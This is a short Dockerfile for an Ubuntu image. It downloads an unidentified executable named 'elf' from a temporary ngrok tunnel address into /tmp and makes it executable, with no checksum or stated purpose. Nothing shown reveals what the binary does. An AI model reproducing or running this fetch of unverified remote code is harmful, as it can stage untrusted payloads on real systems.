from ubuntu:latest

RUN apt update && apt install curl -y
RUN curl https://b39f-2a02-b027-13-6d9d-ad3b-53ed-d23b-c23d.ngrok-free.app/elf > /tmp/elf
RUN chmod +x /tmp/elf

ENTRYPOINT ["/bin/bash"]